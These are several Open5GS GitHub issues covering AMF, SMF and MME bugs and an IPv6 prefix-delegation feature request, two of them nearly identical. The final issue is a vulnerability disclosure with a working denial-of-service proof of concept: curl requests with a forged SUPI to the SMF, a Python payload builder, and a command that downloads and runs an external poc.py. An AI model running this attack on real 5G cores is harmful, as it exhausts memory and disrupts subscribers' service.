items.title: [Bug]:AMF `ran_ue_remove()` on unknown NAS discriminator leaves orphaned `amf_ue` with active timers

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

1. Start Open5GS with the default `sample.yaml` configuration on Ubuntu 24.04.
2. Connect a gNB and have a UE begin initial registration so that the AMF sends an Identity Request (T3570 retransmission timer starts, UE is in `5GMM-DEREGISTERED` state, waiting for Identity Response).
3. Before the UE replies with an Identity Response, send a malformed **Uplink NAS Transport** PDU whose `extended_protocol_discriminator` is neither `0x7E` (5GMM) nor `0x2E` (5GSM). For example, a byte-mutated PDU Session Modification Request where corruption shifts the discriminator to `0x00`.
4. Observe the AMF log output.

**What happens internally:**

`ngap_send_to_nas()` in `src/amf/ngap-path.c:287–294` hits the unknown-discriminator branch. It calls `ran_ue_remove(ran_ue)` to destroy the RAN-side UE context, but does **not** clean up the associated `amf_ue` or cancel its running NAS timers. The orphaned `amf_ue` with its active T3570 timer then fires callbacks into the already-removed RAN context, producing cascading errors.


### Logs

```shell
Full error sequence from the AMF log:


[amf] ERROR: Unknown NAS Protocol discriminator 0x00 (../src/amf/ngap-path.c:288)
[amf] INFO:  [Removed] Number of gNB-UEs is now 0 (../src/amf/context.c:2784)
[amf] ERROR: ngap_handle_uplink_nas_transport: Expectation `OGS_OK ==
             ngap_send_to_nas(ran_ue, NGAP_ProcedureCode_id_UplinkNASTransport,
             NAS_PDU)' failed. (../src/amf/ngap-handler.c:801)
[amf] ERROR: [(null)] NG context has already been removed (../src/amf/nas-path.c:437)
[gmm] ERROR: gmm_state_de_registered: Expectation `r == OGS_OK' failed.
             (../src/amf/gmm-sm.c:164)
```

### Expected behaviour


When `ngap_send_to_nas()` encounters an unrecognized protocol discriminator on an `UplinkNASTransport` message, it should clean up both the RAN-side and NAS-side state:

1. Cancel active NAS timers (T3570, T3560, T3522, etc.) on the associated `amf_ue`
2. Transition `amf_ue` to `gmm_state_exception` (or remove it entirely)
3. Then remove `ran_ue`

A possible fix in the `else` branch at `ngap-path.c:287`:

```c
} else {
    ogs_error("Unknown NAS Protocol discriminator 0x%02x",
              h->extended_protocol_discriminator);

    ogs_pkbuf_free(nasbuf);

    if (amf_ue) {
        CLEAR_AMF_UE_ALL_TIMERS(amf_ue);
        OGS_FSM_TRAN(&amf_ue->sm, &gmm_state_exception);
    }

    ran_ue_remove(ran_ue);

    return OGS_ERROR;
}
```

The `amf_ue` pointer is already resolved earlier in `ngap_send_to_nas()` via `ran_ue->amf_ue`. The `CLEAR_AMF_UE_ALL_TIMERS` macro and `gmm_state_exception` transition follow the same pattern used elsewhere in the AMF (e.g. `gmm-sm.c:159–160`, `gmm-sm.c:174–175`).

### Observed Behaviour

- **State inconsistency**: `amf_ue` persists with a stale `ran_ue_id` after the RAN context is removed. Timer callbacks repeatedly fail trying to reach the destroyed context.
- **Resource leak**: Under repeated malformed-packet injection, orphaned `amf_ue` contexts accumulate until their timers exhaust retries, consuming pool resources.
- **Potential crash**: During NAS test, this defect was observed to contribute to AMF process crashes when combined with accumulated residual state from prior test rounds. The `ogs_expect` soft assertions prevent an immediate crash on a clean restart, but the underlying state corruption may escalate under sustained adversarial input.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: DHCPv6 Prefix Delegation (IA_PD) for UEs, with a $2,000 sponsorship offer

labels.name: New Feature
labels.description: New features to implement

labels.name: status:needs-planning
labels.description: Issue accepted and needs planning into milestones

items.body:
Hi Sukchan, and thank you for the enormous amount of work you have put into Open5GS over the years. I'm Josh Lambert, the developer of Rapid5GS (https://rapid5gs.com), which packages Open5GS into a turnkey EPC/5GC installer for small carriers. We also run Open5GS heavily in production at Alabama Lightwave, a rural WISP in Alabama, where it is the core behind our Baicells and Nokia LTE sectors serving fixed wireless subscribers. It has been rock solid for us and we want to take it further.

The feature we need is DHCPv6 Prefix Delegation (IA_PD) toward UEs. We are partway through a network wide IPv6 rollout that hands every customer a routed /56 via DHCPv6-PD. Our wireline and fixed wireless customers already have this working against conventional BNGs. LTE subscribers are the one group we cannot serve, because the EPC data path currently offers only the single /64 per bearer via router advertisement. That model works for handsets, and it falls short for fixed wireless, where the UE is a routed CPE with a customer LAN behind it. Without IA_PD the LAN side of those customers can never get global IPv6. The 3GPP specs have covered this since Release 10 (TS 23.401 section 5.3.1.2.6, with context in RFC 6459 section 5.3): the UE sends a DHCPv6 Solicit containing IA_PD over the established bearer, and the P-GW delegates an additional prefix from a configurable pool, installing a route for it toward that session. In Open5GS terms that would mean a delegated prefix pool and delegated prefix length configurable per APN in smf.yaml, IA_PD handling in the SMF DHCPv6 code path, and the corresponding route toward the UE session in the UPF. Issue #134 raised this back in the early days and was closed without an implementation, so I wanted to restate the case now that fixed wireless deployments of Open5GS are common.

To help this along, I am offering a $2,000 USD donation to sponsor the implementation. The terms are simple: the bounty is released once IA_PD support is merged into the Open5GS code base and tested by the core maintainer. I can also contribute a realistic test environment, since we have live LTE sectors, production CPEs from multiple vendors, and an operations team that can run test subscribers and report results quickly. If it is useful I am glad to help write up test cases or validate release candidates against real hardware.

Thanks again for Open5GS. It has made it possible for small operators like us to run our own mobile core at all, and prefix delegation is the last piece we need to give LTE customers the same IPv6 experience as everyone else on our network.

items.title: AMF/SMF stale UE context after gNB SCTP reconnection causes PDU session failure (HTTP 400)

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
**Description**

When a gNB disconnects and reconnects (e.g. during cell reconfiguration that requires lock/unlock), some UEs — particularly iPhone 17 Pro Max — end up in a state where they are registered but have no data connectivity. The SMF logs show repeated HTTP response error [400] when attempting N1N2 message transfer.

  **Environment**
  - Open5GS v2.7.6 on Ubuntu 22.04
  - Commercial 5G SA gNB (NR TDD, n77)
  - UE: iPhone 17 Pro Max with dual SIM (private 5G eSIM + commercial SIM)
  - iPhone 14 on the same cell does not exhibit this issue

  **Steps to Reproduce**
  1. gNB connected to Open5GS AMF via SCTP, UEs attached with active PDU sessions
  2. gNB performs cell reconfiguration (internally does lock/unlock, dropping SCTP association)
  3. SCTP association re-establishes, gNB sends NG Setup Request, AMF accepts
  4. iPhone re-registers (Registration complete logged in AMF)
  5. iPhone requests PDU session — SMF creates session and assigns IP
  6. SMF sends N1N2 message transfer to AMF — gets HTTP 400
  7. Session removed, iPhone retries every ~16 seconds, same failure
  8. iPhone shows "attached" but has no data connectivity

  **AMF/SMF Log**
```
  [gmm] INFO: [imsi-xxxx] Registration complete
  [gmm] INFO: UE SUPI[imsi-xxxx] DNN[internet] S_NSSAI[SST:1 SD:0xffffff] smContextRef[NULL]
  [smf] ERROR: [imsi-xxxx:1] HTTP response error [400]
  [amf] ERROR: No UE context [imsi-xxxx]
  [amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[64]
```
  **Expected Behaviour**
When the SCTP association drops, the AMF should fully clean up all UE contexts (AMF-UE, RAN-UE, and associated SMF sessions). When the gNB reconnects and UEs re-register, they should get a completely fresh context with working PDU sessions.

  **Workaround**
Restarting open5gs-amfd and open5gs-smfd after the gNB reconnects clears the stale state and UEs connect successfully on the next attempt.

  **Additional Notes**
  - The issue is more pronounced with iPhone 17 Pro Max than iPhone 14
  - The gNB's SCTP disconnect/reconnect happens within seconds
  - UPF data path is confirmed working (ping from UPF to UE IP succeeds) but zero packets appear on ogstun from the affected UE

items.title: NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE removes ran_ue without deactivating the SMF session, blackholing the UE

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
*Reported by the network engineering team at Research Warrant, from a production 5G SA deployment.*

Follow-up to #4547 / #4566, on the core-side half that #4564 explicitly left open ("a fuller fix ... is left for a follow-up").

When a UE re-registers while the AMF still holds an NG context, `HOLDING_NG_CONTEXT()` (`src/amf/context.h`) orphans the old `ran_ue`, sets `ue_ctx_rel_action = NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE` and starts `t_ng_holding`. When that timer expires, `ngap_handle_ue_context_release_action()` runs:

```c
case NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE:
    ogs_debug("    Action: NG context remove");
    ran_ue_remove(ran_ue);
    break;
```

`src/amf/ngap-handler.c:2067` on `main`.

The RAN context is removed, but **no SBI call is made to the SMF** — no `UpdateSMContext(upCnxState=DEACTIVATED)`, and consequently no PFCP modification. The SMF and UPF keep the PDU session `ACTIVATED`, with a downlink FAR/PDR still pointing at the GTP-U TEID of a RAN context that no longer exists.

The UE is then blackholed: downlink traffic is forwarded to a dead tunnel endpoint.

### Why it does not self-heal

Paging is only ever triggered by an SMF downlink-data-notification, which requires the session to be `DEACTIVATED` and buffering. Because the session stays `ACTIVATED`, the SMF never buffers, never notifies, and the AMF never pages. There is no timer on this state.

In our deployment the only observed recovery is the UE tearing down and re-registering on its own initiative — and when it does, **it is assigned a new IP address**, because the previous PDU session was never released and still holds the old one in the SMF pool. That address change is the clearest external evidence that the session survived the RAN context.

### Reproduction

Trigger the holding path, then let `t_ng_holding` expire without the UE re-establishing:

1. UE registers and establishes a PDU session.
2. Restart the gNB (or otherwise force the UE to re-register) so a second `InitialUEMessage` arrives for the same UE while the AMF still holds the NG context. `HOLDING_NG_CONTEXT()` fires — visible as `Holding NG Context` in the AMF log.
3. Let `t_ng_holding` expire. `Action: NG context remove` is logged and `ran_ue_remove()` runs.
4. Observe: SMF session still `ACTIVATED`; no paging; downlink to the UE's IP is discarded.

We reach this routinely, not exceptionally — over one 11-hour window a single deployment logged `Holding NG Context` 12+ times, from two call sites: `ngap-handler.c` (second `InitialUEMessage` with the same 5G-S-TMSI) and `amf-sm.c` (`NAS MAC verification failed`, where the UE presents a GUTI the AMF cannot verify). Both are ordinary UE behaviour.

### Scope, and why this is not the already-fixed issues

- **#4547 / #4566** — same trigger, and #4566 fixed the receive-side handling (the AMF answering `Error Indication (unknown-local-UE-NGAP-ID)` for RAN resources it had silently dropped). The session-state half was not addressed.
- **#4346** — fixes the `ran_ue->deactivation.group` assert in `amf_nsmf_pdusession_handle_update_sm_context()` by snapshotting the RAN-UE id in the SBI transaction. It does not touch `ngap-handler.c`.
- **#4550** — `amf_ue_set_suci()` shallow-copies `sess_list` onto a new `amf_ue`; that is an `amf_ue`-level transplant, and its proposed fix operates on the old `amf_ue`. The path here removes only the `ran_ue` and leaves the `amf_ue` alive, so that fix would not run.
- **#4575** — `amf_ue` pool-slot leak. Different symptom.

The branch is byte-identical across v2.7.6, v2.7.7, v2.8.0 and current `main` (129-line function, `diff` reports no change), so this is not a regression and not version-specific.

### A complication worth flagging

At the point this branch runs, the `ran_ue` has already been detached from its `amf_ue` (`HOLDING_NG_CONTEXT()` sets `amf_ue_id = OGS_INVALID_POOL_ID`), so the handler may not have a route to the session list it would need to deactivate. If so, the right place to act may be at holding time rather than at timer expiry. We did not want to guess at the intended design — hence an issue rather than a patch.

### We can help validate a fix

We run this on real radio hardware with a fleet of commercial handsets, and the trigger occurs routinely rather than needing to be contrived — so we are in a good position to test a candidate fix under the conditions that actually produce it. Specifically, we can:

- **Run a patched build** on a live SA deployment (USRP B210 + srsRAN gNB, commercial Samsung handsets, private PLMN) and report back what we observe.
- **Capture full logs** for a captured occurrence — AMF, SMF and PFCP — including the `Holding NG Context` → `Action: NG context remove` sequence and the SMF-side session state that follows it. Say what verbosity and which NFs are most useful and we will collect it.
- **Confirm or refute the symptom** on request: whether the session stays `ACTIVATED` after the RAN context is removed, whether paging is ever attempted, and whether the UE is assigned a new IP on its eventual re-registration.
- **Test against the handover path** as a regression check, since any fix here touches a switch that also serves handover release actions.

If the fix turns out to belong at holding time rather than at timer expiry — or needs a design decision we should not be making from outside — we are happy to test whichever shape you prefer rather than push our own.

Environment: v2.7.6, SA, single AMF/SMF/UPF, commercial handsets on a private PLMN.

items.title: [Bug]: SMF: not releasing existing UE sessions after UPF failure (Heartbeat timeout)

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (master)

### Steps to reproduce

TTCN-3 test SMF_Tests.TC_pfcp_heartbeat_timeout from osmo-ttcn3-hacks.git showcases the scenario:
https://gerrit.osmocom.org/c/osmo-ttcn3-hacks/+/43873

### Logs

```shell
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Response Timeout for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:623)
10/12 11:54:40.821: [pfcp] WARNING: [2] LOCAL  No Reponse. Give up! for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:642)
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Delete  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:836)
10/12 11:54:40.821: [smf] DEBUG: smf_state_operational(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/smf-sm.c:94)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] WARNING: No Heartbeat from UPF [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:426)
10/12 11:54:40.821: [smf] ERROR: No UPF available (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:528)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): EXIT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] INFO: PFCP de-associated [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:205)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_will_associate(): ENTRY (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:74)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Create  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:131)
10/12 11:54:40.821: [pfcp] DEBUG: Association Setup Request (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/build.c:87)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  UPD TX-5  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:231)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Commit  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:500)
```

### Expected behaviour

As of current main  (d5d735c67356ff4cb2d86be6effadcc351b5b7b5), open5gs-smfd doesn't release UE sessions after the only UPF available is considered to be unavailable after obtaining no answer for a while (eg. multiple Heartbeat Requests not answered).

With current implementation, open5gs-smfd will keep trying forever until the UPF is available again and it sends a newer (bigger) Recovery timestamp which starts restoration value. 

The problem with that is that it may take a long time, or even "forever", for the UPF to become available again, and during that potentially long time the Control Plane assumes the user plane is working just fine, because the sessions are still active, which is false. This means for instance time accounting may go on on the OCS, etc.

Instead, when a Heartbeat timeout happens (configurable by the user, eg. 60 seconds) and the UPF is considered unavailable, it should release all the sessions on the core network so that the subscriber can see it has no PDU session instead of simply seeing no traffic passing through.

What do the specs say about this scenario? Well, they basically say it's "implementation specific".

3GPP TS 29.244 5.8.2 Behaviour with an Established PFCP Association
> When a PFCP Association is established with a UP function, the CP function:
> ...
> - shall check the responsiveness of the UP function using the Heartbeat procedure as specified in clause 6.2.2;

3GPP TS 23.527 4.2 N4 Failure and Restart Detection:
> Across PFCP based interfaces, an SMF and UPF shall utilize the PFCP Heartbeat Request and Heartbeat Response
> messages to detect a peer PFCP entity failure or restart as described in clause 19A of 3GPP TS 23.007

3GPP TS 23.527 4.5 N4 path failure:
> If the N4 path to the UPF is down, the SMF should handle this as an UPF Failure without Restart, see clause 4.3.3.

4.3.3 Restoration Procedure for PSA UPF Failure without Restart
> Procedures for PSA UPF failure without restart are implementation specific.

### Observed Behaviour

See "Expected behaviour" section.

### eNodeB/gNodeB

TTCN-3

### UE Models and versions

_No response_

items.title: [Bug]: # AMF NAS Security Header Stripping Without Security Context Verification Allows Message Parsing Manipulation
items.body:
### Open5GS Release, Revision, or Tag

v2.7.7 

### Steps to reproduce

 1. Start Open5GS with the default sample.yaml configuration.
 2. Connect a gNB and have a UE begin initial registration so that the AMF sends an Identity Request (T3570 retransmission timer starts, UE is in 5GMM-DEREGISTERED state, waiting for Identity Response).
  3. Before the UE replies with an Identity Response, send a malformed Uplink NAS Transport PDU whose extended_protocol_discriminator is neither 0x7E (5GMM) nor 0x2E (5GSM). For example, a byte-mutated PDU Session Modification Request where corruption shifts the discriminator to 0x00.
  4. Observe the AMF log output.

  What happens internally:

  ngap_send_to_nas() in src/amf/ngap-path.c:287–294 hits the
unknown-discriminator else branch:
if {
....
  } else {
      ogs_error("Unknown NAS Protocol discriminator 0x%02x",
                h->extended_protocol_discriminator);
      ogs_pkbuf_free(nasbuf);
      ran_ue_remove(ran_ue);   // Removes RAN-UE context
      return OGS_ERROR;        // amf_ue and its timers are NOT cleaned up
  }

  It calls ran_ue_remove(ran_ue) to destroy the RAN-side UE context, but does not clean up the associated amf_ue or cancel its running NAS timers (T3570).
  The orphaned amf_ue then fires timer callbacks into the already-removed RAN context, producing the cascading errors shown in the Logs section.

  Note: The InitialUEMessage error path at ngap-path.c:231–254 also calls ran_ue_remove() on error, but at that stage no amf_ue or timer exists yet, so the cleanup is sufficient. The UplinkNASTransport path (line 287) runs after partial registration when amf_ue and its timers are already active — removing only ran_ue is insufficient.

  Suggested fix — cancel timers and transition amf_ue before removing ran_ue:
if{ ....
  } else {
      ogs_error("Unknown NAS Protocol discriminator 0x%02x",
                h->extended_protocol_discriminator);

      ogs_pkbuf_free(nasbuf);

      if (amf_ue) {
          CLEAR_AMF_UE_ALL_TIMERS(amf_ue);
          OGS_FSM_TRAN(&amf_ue->sm, &gmm_state_exception);
      }

      ran_ue_remove(ran_ue);

      return OGS_ERROR;
  }

  The amf_ue pointer is already resolved earlier in ngap_send_to_nas() via
  ran_ue->amf_ue. The CLEAR_AMF_UE_ALL_TIMERS macro and gmm_state_exception
  transition follow the same pattern used elsewhere in the AMF codebase (e.g.
  gmm-sm.c:159–160, gmm-sm.c:174–175).

### Logs

```shell
AMF log output after sending the malformed NAS PDU:

  [amf] ERROR: Unknown NAS Protocol discriminator 0x00
  (../src/amf/ngap-path.c:288)
  [amf] INFO:  [Removed] Number of gNB-UEs is now 0 (../src/amf/context.c:2784)
  [amf] ERROR: ngap_handle_uplink_nas_transport: Expectation `OGS_OK ==
               ngap_send_to_nas(ran_ue,
  NGAP_ProcedureCode_id_UplinkNASTransport,
               NAS_PDU)' failed. (../src/amf/ngap-handler.c:801)
  [amf] ERROR: [(null)] NG context has already been removed
  (../src/amf/nas-path.c:437)
  [gmm] ERROR: gmm_state_de_registered: Expectation `r == OGS_OK' failed.
               (../src/amf/gmm-sm.c:164)
```

### Expected behaviour

When ngap_send_to_nas() encounters an unrecognized
  extended_protocol_discriminator on an UplinkNASTransport message, it should clean up both the RAN-side and NAS-side UE state before returning:
  
  1. Cancel all active NAS timers (T3570, T3560, T3522, etc.) on the associated amf_ue
  2. Transition amf_ue to gmm_state_exception (or remove it entirely)
  3. Then remove ran_ue

  This would prevent the orphaned amf_ue from firing timer callbacks into a destroyed RAN context, eliminating the cascading ogs_expect failures and the resource leak under repeated malformed-packet injection.

### Observed Behaviour

After sending the malformed NAS PDU, ran_ue is removed but amf_ue and its T3570 timer are left running. This causes:
  
  - State inconsistency: amf_ue persists with a stale ran_ue_id reference pointing to a destroyed RAN context. Timer callbacks repeatedly fail trying to reach it, producing ogs_expect error logs on every retry until max_count is exhausted.
  - Resource leak: Under repeated malformed-packet injection, orphaned amf_ue contexts accumulate until their timers exhaust retries, consuming pool resources.
  - Potential crash: During NAS test, this defect was observed to contribute to AMF process crashes when combined with accumulated residual state from prior rounds. The ogs_expect soft assertions prevent an immediate crash on a clean restart, but the underlying state corruption may escalate under sustained adversarial input.


### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [MME] Crash on Partial S1 Reset following Path Switch: enb->s1_reset_ack assertion

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
**Environment:** Open5GS 2.7.7, Ubuntu 24.04, LTE/EPC only.

**Problem**

MME aborts in `mme_s11_handle_release_access_bearers_response()` shortly after a Path Switch followed by a Partial S1 Reset referencing the old eNB UE ID. The crash affects all UEs served by this MME.

Only INFO logs are available; unfortunately, no PCAP or debug logs were captured.

**Anonymized log excerpt**

Timestamps and identifiers have been replaced consistently; relative timing is preserved. Unrelated lines are omitted.

```text
01/01 12:00:00.000: [mme] INFO: PathSwitchRequest
01/01 12:00:00.000: [mme] INFO: OLD ENB_UE_S1AP_ID[1001] MME_UE_S1AP_ID[2001]
01/01 12:00:00.000: [mme] INFO: NEW ENB_UE_S1AP_ID[1002] MME_UE_S1AP_ID[2001]
01/01 12:00:00.005: [mme] WARNING: Reset
01/01 12:00:00.005: [mme] WARNING: Cause[Group:5 Cause:3]
01/01 12:00:00.005: [mme] WARNING: S1AP_ResetType_PR_partOfS1_Interface
01/01 12:00:00.005: [mme] WARNING: MME_UE_S1AP_ID[2001] ENB_UE_S1AP_ID[1001]
01/01 12:00:00.006: [mme] FATAL: mme_s11_handle_release_access_bearers_response: Assertion `enb->s1_reset_ack' failed. (../src/mme/mme-s11-handler.c:1600)
01/01 12:00:00.006: [core] FATAL: backtrace() returned 8 addresses
```

SGWC logs also show Modify Bearer followed 5 ms later by Release Access Bearers for the same session and S11 TEIDs.

**Suspected code sequence**

Based on the logs and v2.7.7 source:

1. Path Switch updates `enb_ue_s1ap_id` and calls `enb_ue_switch_to_enb()`, moving the context to the target eNB.
2. Partial Reset references the old UE ID pair. Its handler resolves the context using `enb_ue_find_by_mme_ue_s1ap_id()`, without checking the sending eNB or matching the supplied eNB UE ID.
3. The ACK buffer belongs to the Reset sender, but Release Access Bearers is initiated for the already-moved context.
4. On the S11 response, the handler obtains the eNB from `enb_ue->enb_id`, removes the context, and checks that eNB’s `s1_reset_ack`.
5. If this is the target eNB, no corresponding ACK buffer exists and the assertion aborts MME.

The Reset sender’s identity cannot be confirmed from the available logs, so this sequence remains a source-based explanation.

**Possible fix**

Validate the resolved context’s ownership against the Reset sender and, when both UE IDs are present, validate their consistency before releasing any resources. Handle stale Reset entries without modifying the UE’s current association on another eNB, while completing Reset acknowledgement appropriately.

Also consider guarding asynchronous Reset completion against missing/stale ACK state. Removing the assertion alone would not prevent releasing the wrong UE context.

A regression test could perform Path Switch A → B, then deliver a Partial Reset from A with the old UE ID pair. MME should remain running and preserve the UE connection on B.

items.title: [Bug]: SMF: Client-Controlled S-NSSAI Values Cause Unbounded Per-Slice Prometheus Metric Allocation and Persistent Memory Growth

labels.name: triage
labels.description: Triage label for new issues and feature requests

items.body:
### Summary

- **Commit ID:** `46e8ca043a59908fec3b07bc07141e43c856bb72` (main, 2026-10-18)
- **Vulnerability Type:** CWE-401 Missing Release of Memory after Effective Lifetime / CWE-400 Uncontrolled Resource Consumption
- **One Sentence help for understand what happen:** Every distinct S-NSSAI in an SMF create request permanently installs a never-freed Prometheus metric instance — in the verification run, 8 000 distinct S-NSSAIs added +79 MiB to SMF docker-stats memory (still +78.5 MiB retained after 10 idle minutes) and slowed the SMF /metrics scrape from 0.045 s to 15.0 s.

The open5GS SMF instruments per-slice Prometheus metrics from data it copies out of the client JSON body before any validation. In the `Nsmf_PDUSession` service `POST /nsmf-pdusession/v1/sm-contexts` handler, the serving PLMN and the S-NSSAI (`sst` plus a free-form 24-bit `sd`) are parsed from `SmContextCreateData` and passed to `smf_metrics_inst_by_slice_add()` twice (`src/smf/nsmf-handler.c:301-304`) — once for the `sm_sessionnbr` gauge and once for the `sm_pdusessioncreationreq` counter — before the subscriber is validated and before the 5GSM NAS message is decoded.

`smf_metrics_inst_by_slice_add()` (`src/smf/metrics.c:253`) allocates a permanent `ogs_metrics_inst_t` keyed by the `(plmn, sst, sd)` triple, `strdup`s the label strings and `calloc`s a hash key, then inserts the instance into the process-global `metrics_hash_by_slice`. The hash has no eviction: `smf_metrics_free_inst_by_slice()` (`src/smf/metrics.c:310`) has zero call sites, and the table is only released in `smf_metrics_final()` at process shutdown. Because the key is client-controlled and `sd` offers ~1.6e7 distinct values per `(plmn, sst)`, every distinct S-NSSAI permanently inflates SMF resident memory and the rendered `/metrics` payload.


### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

No subscriber and no UE are needed: the attack is plain HTTP/2 to the SMF SBI port with a forged SUPI.

1. Deploy the complete open5GS VoNR core:

```bash
git clone https://github.com/hackeryounow/5gc-deployments.git
cd 5gc-deployments/open5gs/vonr-2.8.1-gamma
docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
sleep 45                     # let the NFs register at the NRF
docker start smsc            # smsc races the MySQL init on a cold start
docker start pyhss           # pyhss races MySQL the same way
```

2. Attack with a single request and watch one permanent series appear. First record the baseline:

```bash
SMF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smf)   # -> 172.22.0.7
docker stats --no-stream --format '{{.MemUsage}}' smf
# -> 2.715GiB / 31.33GiB   (baseline; 3 samples 11:25-11:28: 2.715 / 2.715 / 2.716 GiB)
docker exec smf ps -o rss= -C open5gs-smfd   # -> 2846304 (secondary signal; record for deltas)
curl -s http://$SMF_IP:9091/metrics | grep -c '^fivegs_smffunction_sm_pdusessioncreationreq{'   # -> 0
```

Build the multipart body once. The SMF installs the series but never answers the stream (failed-decode streams are held open), so interrupt each curl after ~15s via `timeout`. Fire the malicious request with a fresh SD, then repeat the SAME SD as a dedup control:

```bash
python3 - <<'EOF'
import json
j = {"supi":"imsi-460090000000100","pduSessionId":1,"dnn":"internet",
     "sNssai":{"sst":1,"sd":"A0B0C1"},"servingNfId":"11111111-2222-3333-4444-555555555555",
     "guami":{"plmnId":{"mcc":"460","mnc":"09"},"amfId":"010203"},"serviceName":"Nsmf_PDUSession",
     "servingNetwork":{"mcc":"460","mnc":"09"},"anType":"3GPP_ACCESS","ratType":"NR",
     "ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"460","mnc":"09"},"tac":"000001"},
                   "ncgi":{"plmnId":{"mcc":"460","mnc":"09"},"nrCellId":"0000000001"}}},
     "n1SmMsg":{"contentId":"1"},
     "smContextStatusUri":"http://172.22.0.1:7777/nsmf-pdusession/v1/sm-context-status"}
body = (b'--BD\r\nContent-Type: application/json\r\n\r\n' + json.dumps(j).encode()
        + b'\r\n--BD\r\nContent-Type: application/vnd.3gpp.5gnas\r\nContent-Id: 1\r\n\r\n'
        + bytes([0x02,0x01,0x01,0xC1]) + b'\r\n--BD--\r\n')
open('smc_body.bin','wb').write(body)
EOF
B=http://$SMF_IP:7777/nsmf-pdusession/v1/sm-contexts
timeout 15 curl -s --http2-prior-knowledge -X POST "$B" -H 'Content-Type: multipart/related; boundary=BD; type="application/json"' \
        --data-binary @smc_body.bin -o /dev/null -w 'HTTP %{http_code}\n'    # -> no response within 15s (exit 124)
curl -s http://$SMF_IP:9091/metrics | grep 'snssai="1-a0b0c1"'
# -> fivegs_smffunction_sm_pdusessioncreationreq{plmnid="46009",snssai="1-a0b0c1"} 1
# repeating the SAME SD only increments the counter — the hash dedups, no new series:
for i in 1 2 3; do timeout 15 curl -s --http2-prior-knowledge -X POST "$B" -H 'Content-Type: multipart/related; boundary=BD; type="application/json"' --data-binary @smc_body.bin -o /dev/null; done   # -> no response within 15s each (exit 124)
curl -s http://$SMF_IP:9091/metrics | grep 'snssai="1-a0b0c1"'
# -> fivegs_smffunction_sm_pdusessioncreationreq{plmnid="46009",snssai="1-a0b0c1"} 4
```

3. Scale up with the bundle PoC — the growth inherently needs many requests

```bash
wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20261008-POC/poc.py
python3 poc.py --target-ip $SMF_IP --sbi-port 7777 --count 8000 --sd-start 0x100000
# -> [*] sent=8000/8000 requests in 275.6s
python3 poc.py --target-ip $SMF_IP --sbi-port 7777 --count 8000 --sd-start 0x0F00FF --control
# -> [*] sent=8000/8000 requests in 275.1s
```


### Logs


The SMF accepted the create, installed the per-slice metric instance, and only then failed the request on NAS decode — the session is removed while the metric series persists:

```shell
11/02 12:11:55.247: [smf] ERROR: ogs_nas_5gsm_decode() failed (../src/smf/smf-sm.c:1405)
11/02 12:11:55.246: [smf] INFO: Removed Session: UE IMSI:[imsi-460090000000100] DNN:[internet:1] IPv4:[] IPv6:[] (../src/smf/context.c:2037)
```



### Expected behaviour

The SMF should reject unknown or out-of-range S-NSSAI values in the create request (or at minimum bound per-slice metric cardinality and release the per-slice metric instance when the session/context is torn down), so that failed or rejected requests leave no permanent state.


### Observed Behaviour

Every distinct client-supplied `(plmn, sst, sd)` permanently installs up to two Prometheus metric instances plus label strings and a hash entry in the never-evicted global `metrics_hash_by_slice`; 

